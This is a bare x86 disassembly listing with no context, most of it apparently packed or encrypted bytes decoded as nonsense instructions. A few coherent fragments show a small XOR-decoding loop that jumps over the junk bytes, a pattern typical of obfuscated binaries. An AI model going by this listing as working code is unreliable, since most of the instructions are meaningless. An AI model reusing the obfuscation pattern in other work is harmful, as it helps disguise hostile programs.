  4039b0:	xchg   edx,eax
  4039b1:	in     eax,0x54
  4039b3:	pop    ds
  4039b4:	xchg   edx,eax
  4039b5:	addr16 pop ds
  4039b7:	cmc    
  4039b8:	stos   DWORD PTR es:[edi],eax
  4039b9:	sbb    eax,0x7835914a
  4039be:	cdq    
  4039bf:	stos   DWORD PTR es:[edi],eax
  4039c0:	sub    BYTE PTR [edi],bh
  4039c2:	pop    ebp
  4039c3:	mov    cl,0x26
  4039c5:	mov    ah,0xe6
  4039c7:	dec    esi
  4039c8:	and    esp,DWORD PTR [ebp+edx*1+0x20cdd5a1]
  4039cf:	mov    eax,ds:0x5df4b0be
  4039d4:	mov    BYTE PTR [ecx-0x70],ch
  4039d7:	mov    eax,ds:0x854a06e2
  4039dc:	aaa    
  4039dd:	fisub  DWORD PTR [eax-0x2cb3f6bc]
  4039e3:	pop    esi
  4039e4:	cld    
  4039e5:	mov    ebp,0xa5e3bd09
  4039ea:	call   0xe50f7611
  4039ef:	adc    eax,eax
  4039f1:	sbb    DWORD PTR [ecx-0x13],0x7b
  4039f5:	add    ecx,DWORD PTR [esi+0x47644aea]
  4039fb:	sahf   
  4039fc:	push   ebx
  4039fd:	not    DWORD PTR [ecx+0xf03f0c6]
  403a03:	leave  
  403a04:	out    dx,al
  403a05:	mov    al,0x52
  403a07:	push   es
  403a08:	pusha  
  403a09:	sar    BYTE PTR [edi+0x10],0x7d
  403a0d:	out    0xc0,al
  403a0f:	push   0x43035017
  403a14:	sbb    ebx,ecx
  403a16:	xchg   ebx,eax
  403a17:	cmp    eax,0x73f85b50
  403a1c:	or     dh,bh
  403a1e:	pop    esi
  403a1f:	push   eax
  403a20:	repnz ins DWORD PTR es:[edi],dx
  403a22:	das    
  403a23:	xchg   ecx,eax
  403a24:	inc    esi
  403a25:	mov    dh,ah
  403a27:	add    DWORD PTR [ecx-0x22032340],edx
  403a2d:	loopne 0x403aa5
  403a2f:	jmp    0xc0ee8188
  403a34:	adc    BYTE PTR [edi+0x38],bh
  403a37:	pop    ss
  403a38:	fst    DWORD PTR [edi]
  403a3a:	dec    ebx
  403a3b:	leave  
  403a3c:	ficomp WORD PTR [ebx+0x28]
  403a3f:	fistp  WORD PTR ds:0x47d05a8d
  403a45:	fwait
  403a46:	mov    bl,0x8f
  403a48:	inc    ebx
  403a49:	fist   DWORD PTR [ecx]
  403a4b:	dec    ebx
  403a4c:	jecxz  0x403a71
  403a4e:	jle    0x403a2f
  403a50:	push   ebx
  403a51:	cdq    
  403a52:	pop    ss
  403a53:	or     bl,bh
  403a55:	cwde   
  403a56:	pushf  
  403a57:	ret    
  403a58:	mov    bl,0xc0
  403a5a:	dec    ecx
  403a5b:	loope  0x403a91
  403a5d:	test   eax,0xe964194c
  403a62:	sbb    dh,ch
  403a64:	mov    al,0x83
  403a66:	stos   DWORD PTR es:[edi],eax
  403a67:	xchg   DWORD PTR [ebp+0x25e585ac],esp
  403a6d:	cmp    al,0xc0
  403a6f:	dec    cl
  403a71:	outs   dx,BYTE PTR ds:[esi]
  403a72:	fstp   DWORD PTR [edx-0x30]
  403a75:	outs   dx,BYTE PTR ds:[esi]
  403a76:	cmp    al,0xc0
  403a78:	fadd   DWORD PTR [eax+0x54cc3a1d]
  403a7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a7f:	daa    
  403a80:	adc    esi,DWORD PTR [esi]
  403a82:	push   esi
  403a83:	loope  0x403a44
  403a85:	jae    0x403aeb
  403a87:	test   al,0x2e
  403a89:	push   ebp
  403a8a:	(bad)  
  403a8b:	xchg   edx,eax
  403a8c:	jns    0x403b03
  403a8e:	cs push ebx
  403a90:	mov    ds:0xef059191,al
  403a95:	call   0x676ab94c
  403a9a:	mov    ds:0x457714b,eax
  403a9f:	push   ds
  403aa0:	dec    ebp
  403aa1:	dec    eax
  403aa2:	addr16 daa 
  403aa4:	je     0x403afc
  403aa6:	mov    ebp,0xf575ab5f
  403aab:	jbe    0x403b0a
  403aad:	fs add ch,bh
  403ab0:	sub    ch,BYTE PTR [esi]
  403ab2:	jns    0x403b1f
  403ab4:	push   ds
  403ab5:	pop    es
  403ab6:	in     eax,dx
  403ab7:	pop    ecx
  403ab8:	sub    al,0xae
  403aba:	stos   DWORD PTR es:[edi],eax
  403abb:	in     al,0xbc
  403abd:	pop    ebx
  403abe:	mov    ?,ebx
  403ac0:	jge    0x403a71
  403ac2:	fldcw  WORD PTR [ebx+ebx*8]
  403ac5:	call   0x1724:0xa495916b
  403acc:	push   edx
  403acd:	mov    edx,eax
  403acf:	daa    
  403ad0:	aaa    
  403ad1:	and    al,0x3d
  403ad3:	sub    ecx,edx
  403ad5:	mov    eax,0xe14b2a7e
  403ada:	fisubr WORD PTR [ebx-0x3f]
  403add:	cmp    BYTE PTR [esi-0x548c1c9c],bh
  403ae3:	fimul  DWORD PTR [edx+eiz*4]
  403ae6:	retf   0x20f8
  403ae9:	ins    BYTE PTR es:[edi],dx
  403aea:	cld    
  403aeb:	in     al,0x2b
  403aed:	cmp    BYTE PTR [edi+0x1dd2e714],al
  403af3:	fisub  WORD PTR [ebx+0x2e]
  403af6:	or     eax,0xd9b40b09
  403afb:	sub    DWORD PTR [ebx+0x10],ecx
  403afe:	je     0x403aa4
  403b00:	in     eax,0xc
  403b02:	das    
  403b03:	xchg   esi,eax
  403b04:	push   ebx
  403b05:	jmp    0x93c05dd6
  403b0a:	mov    ds:0xc3f6c5ce,eax
  403b0f:	jno    0x403b40
  403b11:	into   
  403b12:	pop    esp
  403b13:	dec    ebp
  403b14:	cmc    
  403b15:	or     DWORD PTR [edi],esp
  403b17:	xchg   ebp,eax
  403b18:	mov    ds:0xe68cceab,al
  403b1d:	jne    0x403adb
  403b1f:	cwde   
  403b20:	sub    DWORD PTR [edx-0x77bb5b74],edi
  403b26:	test   BYTE PTR [ebx-0x63],bh
  403b29:	or     dl,bh
  403b2b:	push   0x7479d17b
  403b30:	push   ecx
  403b31:	ret    0x779d
  403b34:	imul   edx,eax,0x1
  403b37:	mov    eax,ds:0x940b690e
  403b3c:	xor    al,0x3b
  403b3e:	pop    esp
  403b3f:	cwde   
  403b40:	dec    ebp
  403b41:	xor    BYTE PTR [edi],dl
  403b43:	push   cs
  403b44:	aas    
  403b45:	(bad)  
  403b46:	jp     0x403b26
  403b48:	sbb    BYTE PTR [eax-0x763d71d0],ch
  403b4e:	fwait
  403b4f:	inc    ebx
  403b50:	jecxz  0x403b05
  403b52:	push   0xffffffc9
  403b54:	ja     0x403ae3
  403b56:	sbb    eax,0xdd9b50a0
  403b5b:	pop    edx
  403b5c:	loopne 0x403b3b
  403b5e:	test   DWORD PTR [ecx],ebp
  403b60:	adc    eax,0xc976e070
  403b65:	mov    bl,0x3
  403b67:	sub    dh,bh
  403b69:	mov    esp,0xe897a21b
  403b6e:	pop    edi
  403b6f:	push   esi
  403b70:	pop    edx
  403b71:	dec    ebx
  403b72:	push   edi
  403b73:	xchg   edx,eax
  403b74:	fcom   QWORD PTR [ecx-0x6c726f1c]
  403b7a:	fnstcw WORD PTR [esi+ebx*4+0x7ccb565d]
  403b81:	mov    esp,0x3c5d468f
  403b86:	jecxz  0x403b1a
  403b88:	outs   dx,DWORD PTR ds:[esi]
  403b89:	xchg   ecx,eax
  403b8a:	sti    
  403b8b:	cmc    
  403b8c:	bound  ecx,QWORD PTR [esi+0x4a270653]
  403b92:	call   0x847a:0xfda07a88
  403b99:	into   
  403b9a:	arpl   dx,ax
  403b9c:	push   edx
  403b9d:	adc    ecx,esi
  403b9f:	pop    ebp
  403ba0:	adc    eax,0x171bba16
  403ba5:	jne    0x403be9
  403ba7:	cmp    esi,DWORD PTR [ebx+eiz*4-0x10]
  403bab:	mov    dh,bh
  403bad:	lahf   
  403bae:	ss jae 0x403c19
  403bb1:	add    bl,bl
  403bb3:	and    DWORD PTR [eax+ebx*2-0x2a98fbea],edi
  403bba:	jnp    0x403c1f
  403bbc:	mov    ?,WORD PTR [ebx-0x3739f413]
  403bc2:	adc    DWORD PTR [ebp-0x4d8c0815],ebp
  403bc8:	and    eax,0xb943ddd6
  403bcd:	sbb    BYTE PTR [ebx+ebp*1+0x7b],bh
  403bd1:	aaa    
  403bd2:	push   es
  403bd3:	jmp    0xab4b:0xf0236987
  403bda:	aad    0xd8
  403bdc:	sub    cl,dl
  403bde:	dec    esp
  403bdf:	pop    esi
  403be0:	xor    edi,DWORD PTR [ebp-0x7507ff87]
  403be6:	icebp  
  403be7:	mov    cl,0x39
  403be9:	dec    esi
  403bea:	cmp    eax,0x5ee393fe
  403bef:	(bad)  
  403bf0:	push   ebx
  403bf1:	inc    eax
  403bf2:	fnstenv [edx+ecx*1+0x225610a2]
  403bf9:	dec    edi
  403bfa:	imul   edi,DWORD PTR [edx],0xfffffffd
  403bfd:	nop
  403bfe:	mov    edx,0x7200c50f
  403c03:	sahf   
  403c04:	inc    ebp
  403c05:	mov    al,ds:0x594e5e4e
  403c0a:	jg     0x403c6a
  403c0c:	add    edi,eax
  403c0e:	in     eax,dx
  403c0f:	inc    eax
  403c10:	lahf   
  403c11:	cwde   
  403c12:	pop    edi
  403c13:	mov    ds:0xe389ef12,eax
  403c18:	pushf  
  403c19:	push   esi
  403c1a:	push   edi
  403c1b:	retf   
  403c1c:	cmp    eax,0xb299bf2d
  403c21:	jns    0x403c81
  403c23:	shl    BYTE PTR [ebp-0x21],cl
  403c26:	enter  0xcec2,0x5d
  403c2a:	push   ebx
  403c2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c2c:	cmp    eax,0x2035bad5
  403c31:	fisub  WORD PTR [eax]
  403c33:	aam    0xfa
  403c35:	fwait
  403c36:	or     al,0xfd
  403c38:	or     ecx,0x41b5ff9c
  403c3e:	push   ebx
  403c3f:	fwait
  403c40:	add    dh,al
  403c42:	fidivr WORD PTR [esi-0x3]
  403c45:	jge    0x403cba
  403c47:	jp     0x403c40
  403c49:	arpl   WORD PTR ss:0x8a0882ef,sp
  403c50:	adc    al,0x4
  403c52:	sti    
  403c53:	test   eax,0xa118c0eb
  403c58:	pop    edi
  403c59:	xlat   BYTE PTR ds:[ebx]
  403c5a:	mov    esi,0xdd0b741
  403c5f:	fs or  dl,dh
  403c62:	jb     0x403cd9
  403c64:	leave  
  403c65:	neg    DWORD PTR [ebp+0x1b]
  403c68:	bound  ecx,QWORD PTR [ecx-0x35025f8]
  403c6e:	mov    BYTE PTR [esi],ch
  403c70:	pushf  
  403c71:	push   0xc9039a5e
  403c76:	jle    0x403c5d
  403c78:	mov    cl,BYTE PTR [esp+eax*4+0x69f90697]
  403c7f:	pop    esp
  403c80:	jmp    0x8aa5:0x53f80d01
  403c87:	loop   0x403cb8
  403c89:	xchg   ebx,eax
  403c8a:	les    edx,FWORD PTR [edx-0x2a]
  403c8d:	dec    esi
  403c8e:	add    DWORD PTR [esi+eiz*1-0x53],0x4a
  403c93:	jno    0x403c32
  403c95:	and    bl,bl
  403c97:	nop
  403c98:	pop    edx
  403c99:	mov    BYTE PTR [ebp+0x9b245e],bh
  403c9f:	mov    al,0x5e
  403ca1:	add    ax,di
  403ca4:	movzx  eax,ax
  403ca7:	mov    DWORD PTR [ebp-0x14],eax
  403caa:	mov    eax,DWORD PTR [ebp+0x8]
  403cad:	movzx  eax,WORD PTR [eax+edx*4]
  403cb1:	xor    eax,0x8a38
  403cb6:	add    eax,edi
  403cb8:	mov    edi,DWORD PTR [ebp-0x14]
  403cbb:	mov    BYTE PTR [ebp+edi*1-0x58],al
  403cbf:	mov    eax,DWORD PTR [ebp-0xc]
  403cc2:	inc    edx
  403cc3:	cmp    edx,eax
  403cc5:	jne    0x40389a
  403ccb:	pop    edi
  403ccc:	pop    ebx
  403ccd:	mov    eax,DWORD PTR [ebp-0x8]
  403cd0:	mov    edx,DWORD PTR [ebp+0x10]
  403cd3:	xor    eax,ecx
  403cd5:	add    eax,esi
  403cd7:	mov    DWORD PTR [edx],eax
  403cd9:	jmp    0x4040ce
  403cde:	mov    ch,0xd5
  403ce0:	or     dh,al
  403ce2:	push   0xfffffff1
  403ce4:	jge    0x403d43
  403ce6:	inc    eax
  403ce7:	xchg   ecx,eax
  403ce8:	add    esp,0x31f22f98
  403cee:	mov    ebx,0x567e7e1f
  403cf3:	jns    0x403d73
  403cf5:	jle    0x403cbe
  403cf7:	push   edi
  403cf8:	outs   dx,BYTE PTR ds:[esi]
  403cf9:	cwde   
  403cfa:	push   es
  403cfb:	je     0x403cd7
  403cfd:	and    edx,esp
  403cff:	mov    ?,ebp
  403d01:	cmp    DWORD PTR [edi],edi
  403d03:	xor    DWORD PTR [eax+0x4316c9a4],edx
  403d09:	(bad)  
  403d0a:	out    0x5,eax
  403d0c:	jno    0x403d07
  403d0e:	stc    
  403d0f:	repnz cli 
  403d11:	add    esi,esi
  403d13:	fisttp QWORD PTR [edx+ebx*1]
  403d16:	not    DWORD PTR [eax-0x47]
  403d19:	addr16 aam 0xe5
  403d1c:	jns    0x403d37
  403d1e:	push   ecx
  403d1f:	lods   al,BYTE PTR ds:[esi]
  403d20:	out    0xdb,eax
  403d22:	dec    ebx
  403d23:	fsub   QWORD PTR [edx+esi*8+0x2f]
  403d27:	ret    0x918b
  403d2a:	mov    dl,0x19
  403d2c:	mov    ah,0x51
  403d2e:	mov    edi,0x185ea929
  403d33:	jbe    0x403cd4
  403d35:	fcom   st(7)
  403d37:	and    cl,BYTE PTR [edx]
  403d39:	icebp  
  403d3a:	pop    edi
  403d3b:	mov    bh,0x87
  403d3e:	lahf   
  403d3f:	pop    ecx
  403d40:	push   ebp
  403d41:	js     0x403cc7
  403d43:	lock lock sub cl,bl
  403d47:	mov    dl,0x55
  403d49:	cmp    edi,DWORD PTR [edx+0x6a766163]
  403d4f:	mov    al,ds:0x26740d01
  403d54:	inc    edi
  403d55:	shl    BYTE PTR ss:[eax],1
  403d58:	arpl   WORD PTR ss:[edi-0x10],ax
  403d5c:	loopne 0x403d3f
  403d5e:	inc    ebx
  403d5f:	(bad)
  403d62:	call   0x2810:0xcf0d8898
  403d69:	shl    BYTE PTR [eax-0x66],cl
  403d6c:	mov    bl,0xef
  403d6e:	sub    BYTE PTR [ebp+0x5bc32330],dh
  403d74:	sbb    DWORD PTR [ebp+0x2b],esi
  403d77:	mov    BYTE PTR [ebp+0x0],ah
  403d7a:	sub    eax,0x18b4502f
  403d7f:	xchg   ecx,eax
  403d80:	and    edx,DWORD PTR [ebx+0x16345d05]
  403d86:	push   ebp
  403d87:	sub    eax,0x7130b81
  403d8c:	xor    DWORD PTR ds:0x1d99369d,ebx
  403d92:	mov    edi,0x1c48aeec
  403d97:	das    
  403d98:	popf   
  403d99:	mov    al,0xd3
  403d9b:	addr16 and eax,ecx
  403d9e:	call   0x16e27dc1
  403da3:	jne    0x403d50
  403da5:	fidivr WORD PTR [eax+0x40bec465]
  403dab:	xchg   ebp,eax
  403dac:	mov    ebx,0x8cf1ee8
  403db1:	inc    ebx
  403db2:	push   edi
  403db3:	rol    esp,0xfe
  403db6:	push   cs
  403db7:	popa   
  403db8:	daa    
  403db9:	nop
  403dba:	xor    DWORD PTR [ebx+0x23],ecx
  403dbd:	stos   DWORD PTR es:[edi],eax
  403dbe:	xor    cl,bl
  403dc0:	pusha  
  403dc1:	arpl   bp,bp
  403dc3:	push   ss
  403dc4:	test   BYTE PTR [eax],ah
  403dc6:	pushf  
  403dc7:	(bad)  
  403dc9:	(bad)  
  403dca:	cmp    bh,dh
  403dcc:	scas   eax,DWORD PTR es:[edi]
  403dcd:	fidiv  WORD PTR [ebx]
  403dcf:	push   ss
  403dd0:	dec    edx
  403dd1:	lock inc ebp
  403dd3:	fisttp QWORD PTR [esi+0x3a]
  403dd6:	aad    0xef
  403dd8:	aaa    
  403dd9:	xor    al,0xc
  403ddb:	and    ecx,edx
  403ddd:	(bad)  
  403dde:	fist   DWORD PTR [ecx]
  403de0:	ja     0x403ddd
  403de2:	inc    ebx
  403de3:	sbb    ecx,0xfffffffa
  403de6:	inc    ebx
  403de7:	dec    edi
  403de8:	pop    ebp
  403de9:	push   eax
  403dea:	fneni(8087 only) 
  403dec:	aam    0x46
  403dee:	cmp    edi,DWORD PTR [esi-0x1af0ce9e]
  403df4:	add    BYTE PTR [edx+0x1a],ch
  403df7:	in     eax,dx
  403df8:	outs   dx,DWORD PTR ds:[esi]
  403df9:	mov    ecx,0x4714298a
  403dfe:	jg     0x403e35
  403e00:	sbb    al,0x63
  403e02:	in     eax,dx
  403e03:	pop    ebp
  403e04:	sub    DWORD PTR [eax-0x63180a9d],ecx
  403e0a:	into   
  403e0b:	jne    0x403e42
  403e0d:	jmp    0x403e61
  403e0f:	xchg   DWORD PTR [edi],edi
  403e11:	dec    edi
  403e12:	jmp    0x4106:0x25f829d9
  403e19:	lods   al,BYTE PTR ds:[esi]
  403e1a:	sar    edi,0x39
  403e1d:	retf   
  403e1e:	inc    esp
  403e1f:	push   esp
  403e20:	sub    edi,DWORD PTR [esi-0x32ff3aef]
  403e26:	jns    0x403e2c
  403e28:	test   esp,0xd4d62983
  403e2e:	mov    esp,DWORD PTR [eax-0x64]
  403e31:	push   edi
  403e32:	mov    BYTE PTR [ebx+0x29244b3a],cl
  403e38:	(bad)  
  403e39:	int    0xa4
  403e3b:	xchg   edx,eax
  403e3c:	popf   
  403e3d:	push   eax
  403e3e:	mov    edi,0xd5e7a32a
  403e43:	push   eax
  403e44:	cmp    bh,BYTE PTR [edi-0x5a9f7702]
  403e4a:	cwde   
  403e4b:	xchg   edx,eax
  403e4c:	daa    
  403e4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e4e:	jne    0x403e08
  403e50:	sbb    ah,BYTE PTR [ecx]
  403e52:	out    dx,eax
  403e53:	pop    ecx
  403e54:	xor    al,0xd
  403e56:	mov    al,ah
  403e58:	inc    ecx
  403e59:	mov    esi,0xcb88310
  403e5e:	clc    
  403e5f:	arpl   WORD PTR [eax+0x7b],ax
  403e62:	int    0x2b
  403e64:	xor    DWORD PTR [ecx+0x5d7bc391],ebp
  403e6a:	jnp    0x403ed0
  403e6c:	aas    
  403e6d:	cmp    eax,0xd0e70219
  403e72:	inc    ecx
  403e73:	adc    al,0x63
  403e75:	pushf  
  403e76:	das    
  403e77:	(bad)  
  403e78:	sub    al,0x59
  403e7a:	std    
  403e7b:	xchg   edi,eax
  403e7c:	mov    ch,0xf
  403e7e:	mov    bh,BYTE PTR [eax+ecx*4]
  403e81:	enter  0xc7fd,0xd0
  403e85:	jecxz  0x403e6c
  403e87:	fcom   QWORD PTR [esi-0x64]
  403e8a:	cmp    DWORD PTR [ecx-0x48],edi
  403e8d:	and    BYTE PTR [ecx],dh
  403e8f:	fwait
  403e90:	mov    ch,0x3b
  403e92:	inc    esp
  403e93:	int3   
  403e94:	les    ebp,FWORD PTR ds:0x76013c17
  403e9a:	in     eax,0x7b
  403e9c:	xchg   esp,eax
  403e9d:	aas    
  403e9e:	dec    esi
  403e9f:	iret   
  403ea0:	jmp    0x403e7a
  403ea2:	pop    edx
  403ea3:	sbb    eax,DWORD PTR [edi+0x67]
  403ea6:	and    DWORD PTR ds:0xc6a15071,ecx
  403eac:	cmp    eax,DWORD PTR ds:0x6b529eb4
  403eb2:	add    ebp,DWORD PTR [eax+0x61c2ee46]
  403eb8:	and    BYTE PTR [ebx+0x1],0x82
  403ebc:	loopne 0x403e84
  403ebe:	sub    BYTE PTR [esi],bh
  403ec0:	pop    ebx
  403ec1:	jmp    0xaf31:0xb822cf28
  403ec8:	adc    eax,0xf12e066b
  403ecd:	mov    ds:0x15e72fcb,al
  403ed2:	mov    edi,0x5ec86e21
  403ed7:	in     al,0x3
  403ed9:	cs out 0x13,al
  403edc:	sbb    al,0xc4
  403ede:	dec    eax
  403edf:	js     0x403ee9
  403ee1:	jge    0x403f30
  403ee3:	mov    esp,0x80beb8c7
  403ee8:	mov    al,ds:0xef8b760a
  403eed:	popf   
  403eee:	mov    edx,0xe1fd77aa
  403ef3:	nop
  403ef4:	cwde   
  403ef5:	xor    bl,bh
  403ef7:	push   ss
  403ef8:	fimul  WORD PTR [esi+edi*4]
  403efb:	mov    cl,0xe9
  403efd:	adc    esi,eax
  403eff:	es ja  0x403f12
  403f02:	imul   edi,DWORD PTR [edx+0x577edf39],0xffffffe9
  403f09:	mov    dl,0x9c
  403f0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f0c:	sub    BYTE PTR [edx+edi*4+0x21],0x3c
  403f11:	cmp    BYTE PTR [esi+0x616f4596],ah
  403f17:	ds repz ss adc al,0x9d
  403f1c:	sub    ch,dl
  403f1e:	mov    DWORD PTR [ebx+0x76e3cb2],ebp
  403f24:	fidiv  WORD PTR [ecx+eax*1+0x67350193]
  403f2b:	and    al,0x7f
  403f2d:	mov    ?,WORD PTR [edx]
  403f2f:	and    ah,bh
  403f31:	mov    ecx,esp
  403f33:	mov    esp,DWORD PTR [eax-0xceb0df2]
  403f39:	adc    al,0x33
  403f3b:	cmp    esi,DWORD PTR [ecx]
  403f3d:	loope  0x403f84
  403f3f:	mov    ebp,eax
  403f41:	test   DWORD PTR [esi+0x1289b7a9],esi
  403f47:	ins    BYTE PTR es:[edi],dx
  403f48:	or     al,0x7f
  403f4a:	cmp    eax,DWORD PTR [ebp+0x51]
  403f4d:	mov    bl,0xe5
  403f4f:	jne    0x403ef0
  403f51:	cld    
  403f52:	mov    bl,0x23
  403f54:	out    dx,eax
  403f55:	leave  
  403f56:	or     al,0x6b
  403f58:	xor    eax,0x38ce4aea
  403f5d:	push   ebx
  403f5e:	inc    edi
  403f5f:	sbb    edx,DWORD PTR [ebp+0x25f869cb]
  403f65:	test   eax,0xce60f0b6
  403f6a:	sahf   
  403f6b:	gs mov dh,0x3d
  403f6e:	sahf   
  403f6f:	lods   eax,DWORD PTR ds:[esi]
  403f70:	inc    ecx
  403f71:	jmp    0x403f4e
  403f73:	jecxz  0x403f23
  403f75:	push   edi
  403f76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f77:	jnp    0x403fe7
  403f79:	xor    ebp,edi
  403f7b:	jmp    0x403f5a
  403f7d:	jmp    0x56617dd
  403f82:	outs   dx,BYTE PTR ds:[esi]
  403f83:	mov    al,0x8f
  403f85:	cmp    eax,0x657fda87
  403f8a:	out    0x92,eax
  403f8c:	cmp    ah,BYTE PTR [eax+0x20]
  403f8f:	test   al,0x31
  403f91:	fst    DWORD PTR [edx+0x79]
  403f94:	stc    
  403f95:	push   ds
  403f96:	add    DWORD PTR [edx+0x1f3aecb5],edi
  403f9c:	(bad)  
  403f9d:	fisubr WORD PTR [edi+0x75d6a9b0]
  403fa3:	scas   al,BYTE PTR es:[edi]
  403fa4:	neg    dl
  403fa6:	out    0x63,eax
  403fa8:	lahf   
  403fa9:	push   edx
  403faa:	xchg   esp,eax
  403fab:	push   DWORD PTR [ecx+0x5c]
  403fae:	pop    esi
  403faf:	ja     0x403ffe
  403fb1:	mov    al,ds:0x2e6b2202
  403fb6:	cmp    cl,BYTE PTR [ebx-0x26b9c99a]
  403fbc:	adc    BYTE PTR [ebx-0x62],bl
  403fbf:	sub    dh,BYTE PTR [edx]
  403fc1:	pop    esp
  403fc2:	fmul   QWORD PTR [edx+ebp*1-0x5450c637]
  403fc9:	dec    ecx
  403fca:	inc    eax
  403fcb:	or     dh,BYTE PTR [ebx]
  403fcd:	fs adc eax,edx
  403fd0:	loope  0x403fae
  403fd2:	or     eax,0xb4d6369c
  403fd7:	mov    al,ds:0x8834a4ef
  403fdc:	leave  
  403fdd:	test   al,0x44
  403fdf:	int3   
  403fe0:	mov    al,ds:0xa30d139f
  403fe5:	mov    edx,0xeb101e58
  403fea:	sbb    al,0xd7
  403fec:	lds    esi,FWORD PTR [esi]
  403fee:	imul   eax,esi,0xffffff8a
  403ff1:	sbb    ecx,esi
  403ff3:	xor    BYTE PTR [edi+edi*2+0x67c90105],dh
  403ffa:	mov    BYTE PTR [ecx-0x1e],dl
  403ffd:	sub    al,0x1d
  403fff:	loop   0x403fe7
  404001:	ins    DWORD PTR es:[edi],dx
  404002:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404003:	loope  0x403f8b
  404005:	dec    ecx
  404006:	in     al,dx
  404007:	inc    ebx
  404008:	pop    edx
  404009:	dec    ebp
  40400a:	in     eax,0xc3
  40400c:	sahf   
  40400d:	fmul   DWORD PTR [edx+0x2ec77be6]
  404013:	push   eax
  404014:	xchg   esp,eax
  404015:	jnp    0x404010
  404017:	push   ebp
  404018:	dec    ecx
  404019:	xor    ch,BYTE PTR [ecx]
  40401b:	dec    ebp
  40401c:	pop    eax
  40401d:	shr    BYTE PTR [edi-0x53],cl
  404020:	int    0x2d
  404022:	pushf  
  404023:	mov    ecx,0x632f81fa
  404028:	mov    dh,0x95
  40402a:	sub    BYTE PTR [ebp+0x22],bl
  40402d:	push   es
  40402e:	push   ebp
  40402f:	ss stos BYTE PTR es:[edi],al
  404031:	repz repz sahf 
  404034:	leave  
  404035:	pop    esp
  404036:	cmp    eax,0x448dc1c4
  40403b:	out    dx,al
  40403c:	rcr    DWORD PTR ds:0x2df906a9,0xff
  404043:	push   edx
  404044:	push   ebx
  404045:	mov    bl,0x47
  404047:	dec    ebp
  404048:	mov    eax,DWORD PTR [eax+0x17]
  40404b:	pop    eax
  40404c:	xor    al,0x1c
  40404e:	hlt    
  40404f:	leave  
  404050:	lds    esp,FWORD PTR [eax-0x28]
  404053:	aaa    
  404054:	nop
  404055:	popa   
  404056:	pop    edx
  404057:	iret   
  404058:	ds fcmovnu st,st(4)
  40405b:	repnz fild DWORD PTR [edi+0x2228ba]
  404062:	push   esi
  404063:	call   DWORD PTR [ecx+0x6c]
  404066:	and    al,0xa
  404068:	mov    dl,0xe3
  40406a:	lds    edx,FWORD PTR [ecx]
  40406c:	and    ecx,DWORD PTR [esi+0x3f]
  40406f:	std    
  404070:	xor    BYTE PTR [ebx-0x5b],bh
  404073:	fdivp  st(3),st
  404075:	popf   
  404076:	sub    DWORD PTR [ebp-0x74],edx
  404079:	sbb    edx,ebp
  40407b:	jns    0x404078
  40407d:	sub    ebp,edx
  40407f:	mov    dl,0xdd
  404081:	pop    eax
  404082:	std    
  404083:	stos   BYTE PTR es:[edi],al
  404084:	dec    ecx
  404085:	fadd   st(0),st
  404087:	mov    bl,0x1f
  404089:	mov    ebx,0xd7c461e3
  40408e:	loopne 0x404017
  404090:	pop    eax
  404091:	adc    BYTE PTR [ebx],0xb1
  404094:	xchg   BYTE PTR [esi+eax*8-0x25808e1a],al
  40409b:	sbb    DWORD PTR [ecx],eax
  40409d:	or     eax,DWORD PTR [eax-0x7773a24e]
  4040a3:	clc    
  4040a4:	lods   eax,DWORD PTR ds:[esi]
  4040a5:	lock mov al,ds:0xd2676c4a
  4040ab:	push   es
  4040ac:	into   
  4040ad:	fsubr  DWORD PTR [esi-0x1897446e]
  4040b3:	in     eax,0x57
  4040b5:	add    DWORD PTR [esi],ebx
  4040b7:	aaa    
  4040b8:	adc    edx,DWORD PTR [esi+0x33]
  4040bb:	mov    BYTE PTR [ecx],dl
  4040bd:	add    DWORD PTR [ecx],esi
  4040bf:	push   es
  4040c0:	xchg   edi,eax
  4040c1:	cdq    
  4040c2:	mov    gs,esi
  4040c4:	adc    al,0xc5
  4040c6:	add    al,BYTE PTR [edi]
  4040c8:	call   0x8bb1:0x1db68762
  4040cf:	inc    ebp
  4040d0:	clc    
  4040d1:	xor    eax,ecx
  4040d3:	add    eax,esi
  4040d5:	mov    DWORD PTR [ebp+0x8],eax
  4040d8:	mov    eax,DWORD PTR [ebp+0x8]
  4040db:	jmp    0x4044d0
  4040e0:	pop    edx
  4040e1:	ret    0x1375
  4040e4:	jge    0x4040a3
  4040e6:	ins    BYTE PTR es:[edi],dx
  4040e7:	jae    0x404096
  4040e9:	test   BYTE PTR [eax-0x111ff733],ah
  4040ef:	push   0xffffff93
  4040f1:	sbb    edi,DWORD PTR [esi+0x7e]
  4040f4:	push   esi
  4040f5:	jns    0x404175
  4040f7:	jle    0x404130
  4040f9:	mov    cs,WORD PTR [ebp-0x7aaabd7e]
  4040ff:	aaa    
  404100:	cmc    
  404101:	scas   al,BYTE PTR es:[edi]
  404102:	dec    ebp
  404103:	inc    ebp
  404104:	mov    ds:0x5a74e271,al
  404109:	pop    ecx
  40410a:	out    0xbc,eax
  40410c:	fst    st(7)
  40410e:	(bad)  
  40410f:	jl     0x404176
  404111:	in     al,0xe7
  404113:	ins    DWORD PTR es:[edi],dx
  404114:	inc    edi
  404115:	xchg   esp,eax
  404116:	mov    BYTE PTR [ebp-0x58],ch
  404119:	cmp    esi,ebx
  40411b:	sub    al,0xe
  40411d:	xor    ecx,DWORD PTR [edx]
  40411f:	adc    eax,0x44c0d5b2
  404124:	scas   al,BYTE PTR es:[edi]
  404125:	scas   eax,DWORD PTR es:[edi]
  404126:	or     al,0x49
  404128:	bound  esp,QWORD PTR [edi]
  40412a:	jl     0x4041a1
  40412c:	cdq    
  40412d:	std    
  40412e:	aas    
  40412f:	(bad)  
  404130:	jge    0x404103
  404132:	push   0x34
  404134:	xchg   edx,eax
  404135:	js     0x40413a
  404137:	sbb    BYTE PTR [edi],ah
  404139:	sbb    eax,0xef216aea
  40413e:	bound  esi,QWORD PTR ds:0x5d2558b3
  404144:	dec    eax
  404145:	call   0x6b92:0x57a70248
  40414c:	xchg   BYTE PTR [esi],ch
  40414e:	pop    ss
  40414f:	mov    ebp,0xc8122cd0
  404154:	lds    edi,FWORD PTR [ebx-0x1a2c3cac]
  40415a:	mov    eax,ds:0x18ce7015
  40415f:	in     al,dx
  404160:	and    ah,bh
  404162:	pop    esi
  404163:	jmp    0x404103
